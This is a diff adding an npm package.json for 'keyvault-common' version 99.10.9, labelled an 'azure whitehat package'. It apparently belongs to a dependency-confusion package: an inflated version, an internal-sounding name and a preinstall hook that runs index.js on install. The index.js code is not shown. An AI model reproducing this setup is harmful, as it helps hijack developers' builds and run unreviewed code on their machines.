@@ -1,0 +1,39 @@
+{
+    "name": "keyvault-common",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "keyvault-common@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-oDXgjUlA+UxXWlSaha/Ecj3q6ziZ32paE3UsHjVorvDOocM04nfpwLFnci43gEMeazv5jq9GDBkq+9gtzjRjiQ==",
+        "shasum": "e17530703001571e8aea543a80e88040e6be2f1a",
+        "tarball": "https://registry.npmjs.org/keyvault-common/-/keyvault-common-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3579,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhooKgCRA9TVsSAnZWagAAwFIP/2h21TohyHBJDjFzohh3\nGCmimUTY4PEA6E8Ljsv7kVatJ4KzwaYxKOMWhSmV0hqh1wi5N6eoxUaa8DtL\nD9uAt7ZuzATSaGn6CdaCm7MNf1rAuTu5qVEOK5xk3QUCNKrcz8nJgAV0LHOi\ny3jqIUei9uM3fDb4r2OKIi+CvsCLacXUL3MBjC84HJryV+lXQDYeKn5iGC/9\n3IgfnsnpON+MmFRVIjT0TrIbHq2pO17co2XBZ/cWKZ9l64z9pCQyfK7bLsUF\nalfqVcJDwvq6++FYKJHuSQlHS3M2x+3+kRo3MbSg1WKxVFZOs70qB8QHwX/k\neHqNLEFPylDAwtBRHAbDKIwCCgHeIrg26GryBz2XRDr191a+d8P0JJHA9XzO\nkQssbm4Rgj3xj5MYIN6S1d5PZDnuifOovL4Es7xJ+AuB/G7keKYkgvx1I9pF\nRP4sIExFDyfgCEuhwf0KLBE8UdiTv4t/5Ig0ODgIpwju3rMG2h5qlA4Dnp0X\nzxGW4LHUlK1rQiVBq52988ud74ksjFONBMnD/pJeGT/v4zQ8P2/v1pp8azlg\ntqW0y2bs1lcNMZcPeO13Bs91g47/CH8aWWE1n2aJ7PA6N8nXp9HAATcsofpm\nqjoLxh4gLyB0VjlF5wYbDu31OrlZncBvm0Ovwubz3aK3A9EZg9b531zG8IYF\nnDK2\r\n=aBlp\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/keyvault-common_99.10.9_1638040224782_0.006014667220678005"
+    },
+    "_hasShrinkwrap": false
+}
